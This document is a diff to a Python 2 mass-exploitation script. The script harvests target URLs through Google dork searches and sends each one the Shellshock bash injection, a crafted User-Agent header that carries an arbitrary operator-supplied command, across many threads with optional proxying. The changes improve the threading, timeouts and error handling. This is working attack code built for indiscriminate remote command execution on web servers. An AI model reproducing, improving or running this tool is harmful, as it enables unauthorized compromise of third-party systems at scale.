@@ -4,22 +4,25 @@ import random, sys, argparse, time
 
 
 class Exploit(threading.Thread):
-	def __init__(self, targets, cmd):
-		self.targets = targets
+	def __init__(self, google, cmd):
+		self.targets = google.targets
+		self.google = google
 		self.cmd = cmd
 		threading.Thread.__init__(self)
 
 	def run(self):
-		while not self.targets.empty():
-			url = self.targets.get()
-			try:
-				headers = {"User-Agent":"() { :; }; " + self.cmd}
-				r = requests.get(url, headers = headers, verify = False)
-				print str(r.status_code) + " : " + url
-			except Exception as e:
-				print str(e) + url
-			finally:
-				self.targets.task_done()
+		while not self.google.dead:
+			while not self.targets.empty(): 
+				url = self.targets.get()
+				try:
+					headers = {"User-Agent":"() { :; }; " + self.cmd}
+					r = requests.get(url, headers = headers, verify = False)
+					print str(r.status_code) + " : " + url
+				except Exception as e:
+					print str(e) + url
+				finally:
+					self.targets.task_done()
+			time.sleep(0.1)
 
 class Google(threading.Thread):
 	def __init__(self, dork, count):
@@ -27,6 +30,7 @@ class Google(threading.Thread):
 		self.count = count
 		self.targets = Queue.Queue()
 		self.launch = False
+		self.dead = False
 		threading.Thread.__init__(self)
 
 	def run(self):
@@ -38,9 +42,11 @@ class Google(threading.Thread):
 				else:
 					self.launch = False
 				time.sleep(random.random()*3)
-			self.launch = True
 		except Exception as e:
-			print e
+			print "Cant Connect to Google!"
+		finally:
+			self.launch = True
+			self.dead = True			
 		print "Google Search Done"
 
 	def google(self, dork, index):
@@ -49,7 +55,7 @@ class Google(threading.Thread):
 		#userAgent = 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36';
 		#headers = {"User-Agent":userAgent}
 
-		r = requests.get(url)
+		r = requests.get(url, timeout=10)
 		if r.status_code == 503:
 			print "Blocked by Google!"
 
@@ -104,6 +110,7 @@ if args.proxy:
 			proxy_type = socks.PROXY_TYPE_HTTP
 		else:
 			print "Unsupported proxy type!"
+			sys.exit(1)
 		socks.setdefaultproxy(proxy_type, host, port)
 		socket.socket = socks.socksocket
 	except Exception as e:
@@ -115,18 +122,19 @@ print "[ DORK ]\t"+dork
 print "[ THREAD ]\t"+str(args.thread_count)
 print "[ PAGE ]\t"+str(args.page_count)
 
-payload = Google(dork, args.page_count)
+google = Google(dork, args.page_count)
 print "Google Searching..."
-payload.start()
+google.start()
 
 
-while not payload.launch:
+while not google.launch:
 	time.sleep(0.1)
 
 pool = []
 for i in range(0,args.thread_count):
-	exp = Exploit(payload.targets, args.cmd)
+	exp = Exploit(google, args.cmd)
 	pool.append(exp)
+	exp.daemon = True
 	exp.start()
 
 for th in pool:
